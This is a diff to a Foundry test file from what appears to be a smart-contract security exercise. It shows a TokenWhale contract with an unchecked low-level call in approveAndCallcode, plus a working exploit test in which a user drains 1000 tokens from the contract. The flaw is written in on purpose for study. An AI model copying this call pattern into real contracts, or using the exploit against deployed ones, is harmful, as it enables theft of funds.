@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.15;
+pragma solidity ^0.8.18;
 
+// this excersise is about  a low level call to a contract where input and return values are not checked
 import "forge-std/Test.sol";
 
 contract ContractTest is Test {
@@ -10,18 +11,38 @@ contract ContractTest is Test {
         address alice = vm.addr(1);
         TokenWhaleContract = new TokenWhale();
         TokenWhaleContract.TokenWhaleDeploy(address(TokenWhaleContract));
-        console.log("TokenWhale balance:", TokenWhaleContract.balanceOf(address(TokenWhaleContract)));
+        console.log(
+            "TokenWhale balance:",
+            TokenWhaleContract.balanceOf(address(TokenWhaleContract))
+        );
 
         // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);
 
-        console.log("Alice tries to perform unsafe call to transfer asset from TokenWhaleContract");
+        console.log(
+            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
+        );
         vm.prank(alice);
         TokenWhaleContract.approveAndCallcode(
-            address(TokenWhaleContract), 0, abi.encodeWithSignature("transfer(address,uint256)", address(alice), 1000)
+            address(TokenWhaleContract),
+            0x1337, // doesn't affect the exploit
+            abi.encodeWithSignature(
+                "transfer(address,uint256)",
+                address(alice),
+                1000
+            )
         );
+
+        // check if the exploit is successful
+        assertEq(TokenWhaleContract.balanceOf(address(alice)), 1000);
         console.log("Exploit completed");
-        console.log("TokenWhale balance:", TokenWhaleContract.balanceOf(address(TokenWhaleContract)));
-        console.log("Alice balance:", TokenWhaleContract.balanceOf(address(alice)));
+        console.log(
+            "TokenWhale balance:",
+            TokenWhaleContract.balanceOf(address(TokenWhaleContract))
+        );
+        console.log(
+            "Alice balance:",
+            TokenWhaleContract.balanceOf(address(alice))
+        );
     }
 
     receive() external payable {}
@@ -64,7 +85,11 @@ contract TokenWhale {
         _transfer(to, value);
     }
 
-    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
 
     function approve(address spender, uint256 value) public {
         allowance[msg.sender][spender] = value;
@@ -79,16 +104,19 @@ contract TokenWhale {
         allowance[from][msg.sender] -= value;
         _transfer(to, value);
     }
+
     /* Approves and then calls the contract code*/
 
-    function approveAndCallcode(address _spender, uint256 _value, bytes memory _extraData)
-        public
-        returns (bool success)
-    {
+    function approveAndCallcode(
+        address _spender,
+        uint256 _value,
+        bytes memory _extraData
+    ) public {
         allowance[msg.sender][_spender] = _value;
 
-        //Call the contract code
-        _spender.call(_extraData); //vulnerable point
-            // return true;
+        bool success;
+        // vulnerable call execute unsafe user code
+        (success, ) = _spender.call(_extraData);
+        console.log("success:", success);
     }
 }
